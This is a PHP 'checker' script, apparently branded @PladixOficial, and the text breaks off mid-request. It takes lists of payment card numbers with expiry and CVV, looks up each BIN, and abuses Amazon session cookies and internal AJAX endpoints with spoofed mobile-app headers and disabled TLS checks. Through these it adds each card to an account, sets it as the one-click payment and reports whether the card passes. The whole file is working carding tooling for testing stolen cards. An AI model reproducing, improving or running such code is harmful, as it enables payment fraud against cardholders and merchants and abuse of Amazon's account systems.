<?php
error_reporting(0);
ignore_user_abort();
session_start();

$time = time();

function getstr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

function getstr2($string, $start, $end, $line = 1) {
$str = explode($start, $string);
$str = explode($end, $str[$line]);
return $str[0];
}

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}


$lista = str_replace(array(" "), '/', $_GET['lista']);
  $regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

  if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
  die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@PladixOficial</span><br>');
  }

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function gerarLetrasAleatorias($quantidade) {
$letras = 'abcdefghijklmnopqrstuvwxyz';
$tamanhoLetras = strlen($letras);
$resultado = '';

for ($i = 0; $i < $quantidade; $i++) {
$indice = rand(0, $tamanhoLetras - 1);
$resultado .= $letras[$indice];
}

return $resultado;
}

$quantidadeLetras = 7; 
$letrasAleatorias = gerarLetrasAleatorias($quantidadeLetras);

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

// --- Início da consulta de BIN segura ---
$bin = substr($cc, 0, 6);
$ch_bin = curl_init();
curl_setopt($ch_bin, CURLOPT_URL, 'https://lookup.binlist.net/' . $bin);
curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch_bin, CURLOPT_HTTPHEADER, array(
    'Accept-Version: 3',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
));
$bin_result = curl_exec($ch_bin);
curl_close($ch_bin);

$infobin = '';
if ($bin_result) {
    $bin_data = json_decode($bin_result);
    if (json_last_error() === JSON_ERROR_NONE && $bin_data && !isset($bin_data->error)) {
        $scheme = isset($bin_data->scheme) ? strtoupper($bin_data->scheme) : 'N/A';
        $type = isset($bin_data->type) ? strtoupper($bin_data->type) : 'N/A';
        $brand = isset($bin_data->brand) ? $bin_data->brand : 'N/A';
        $bank = isset($bin_data->bank->name) ? $bin_data->bank->name : 'N/A';
        $country = isset($bin_data->country->name) ? $bin_data->country->name . ' ' . $bin_data->country->emoji : 'N/A';

        $infobin = "-> $scheme/$type/$brand, $bank, $country";
    }
}
// --- Fim da consulta de BIN segura ---

 $cookieprim = $_GET['cookie'];

 if($cookieprim == null){

die("Coloque os cookies da amazon.com no formulário de salvar cookies!");    
    
}

 $cookieprim = trim($cookieprim);

function convertCookie($text, $outputFormat = 'BR')
{
$countryCodes = [
'ES' => ['code' => 'acbes', 'currency' => 'EUR', 'lc' => 'lc-acbes', 'lc_value' => 'es_ES'],
'MX' => ['code' => 'acbmx', 'currency' => 'MXN', 'lc' => 'lc-acbmx', 'lc_value' => 'es_MX'],
'IT' => ['code' => 'acbit', 'currency' => 'EUR', 'lc' => 'lc-acbit', 'lc_value' => 'it_IT'],
'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'DE' => ['code' => 'acbde', 'currency' => 'EUR', 'lc' => 'lc-main', 'lc_value' => 'de_DE'],
'BR' => ['code' => 'acbbr', 'currency' => 'BRL', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'AE' => ['code' => 'acbae', 'currency' => 'AED', 'lc' => 'lc-acbae', 'lc_value' => 'en_AE'],
'SG' => ['code' => 'acbsg', 'currency' => 'SGD', 'lc' => 'lc-acbsg', 'lc_value' => 'en_SG'],
'SA' => ['code' => 'acbsa', 'currency' => 'SAR', 'lc' => 'lc-acbsa', 'lc_value' => 'ar_AE'],
'CA' => ['code' => 'acbca', 'currency' => 'CAD', 'lc' => 'lc-acbca', 'lc_value' => 'ar_CA'],
'PL' => ['code' => 'acbpl', 'currency' => 'PLN', 'lc' => 'lc-acbpl', 'lc_value' => 'pl_PL'],
'AU' => ['code' => 'acbau', 'currency' => 'AUD', 'lc' => 'lc-acbpl', 'lc_value' => 'en_AU'],
'JP' => ['code' => 'acbjp', 'currency' => 'JPY', 'lc' => 'lc-acbjp', 'lc_value' => 'ja_JP'],
'FR' => ['code' => 'acbfr', 'currency' => 'EUR', 'lc' => 'lc-acbfr', 'lc_value' => 'fr_FR'],
'IN' => ['code' => 'acbin', 'currency' => 'INR', 'lc' => 'lc-acbin', 'lc_value' => 'en_IN'],
'NL' => ['code' => 'acbnl', 'currency' => 'EUR', 'lc' => 'lc-acbnl', 'lc_value' => 'nl_NL'],
'UK' => ['code' => 'acbuk', 'currency' => 'GBP', 'lc' => 'lc-acbuk', 'lc_value' => 'en_GB'],
'TR' => ['code' => 'acbtr', 'currency' => 'TRY', 'lc' => 'lc-acbtr', 'lc_value' => 'tr_TR'],
];

if (!array_key_exists($outputFormat, $countryCodes)) {
return $text;
}

$currentCountry = $countryCodes[$outputFormat];

$text = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg', 'acbus', 'acbde'], $currentCountry['code'], $text);
$text = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $currentCountry['currency'], $text);
$text = preg_replace('/(' . $currentCountry['lc'] . '=)[a-z]{2}_[A-Z]{2}/', '$1' . $currentCountry['lc_value'], $text);
$text = str_replace('acbuc', $currentCountry['code'], $text);

return $text;
}


function generateRandomString($length = 12) {
$characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];
}
return $randomString;
}

$_com_cookie = convertCookie($cookieprim, 'US');
$tries = 3;

$ch = curl_init(); 
curl_setopt_array($ch, [
    CURLOPT_URL            => 'https://www.amazon.com/ax/account/manage?openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account&openid.assoc_handle=usflex&shouldShowPasskeyLink=true&passkeyEligibilityArb=455b1739-065e-4ae1-820a-d72c2583e302&passkeyMetricsActionId=781d7a58-8065-473f-ba7a-f516071c3093',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIE         => $_com_cookie,
    CURLOPT_ENCODING       => "gzip",
    CURLOPT_HTTPHEADER     => array(
        'Host: www.amazon.com',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'X-Requested-With: com.amazon.mShop.android.shopping',
        'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
    ),
]);
  $r = curl_exec($ch);
if (strpos($r, "Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later.")) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

    } else {

    }

$cookie2 = convertCookie($cookieprim, 'US');

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'X-Requested-With: com.amazon.dee.app',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);



$csrf = getstr($r, 'csrfToken = "','"');


$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22'.generateRandomString(10).'+'.generateRandomString(10).'%22%2C%22cc_ExpirationMonth%22%3A%22'.intval($mes).'%22%2C%22cc_ExpirationYear%22%3A%22'.$ano.'%22%7D%7D%7D&csrfToken='.urlencode($csrf).'&addCreditCardNumber='.$cc.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

$cardid_puro = getstr($r, '"paymentInstrumentId":"','"');

if (strpos($r, 'paymentInstrumentId')) {

}
else{


die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

}

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken='.urlencode($csrf).'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

$addresid = getStr($r, 'AddressId":"','"');

if(empty($addresid)) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Conta sem endereço, adicione um endereço na conta antes de fazer os testes. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

}

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22'.$cardid_puro.'%22%2C%22billingAddressId%22%3A%22'.$addresid.'%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken='.urlencode($csrf).'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
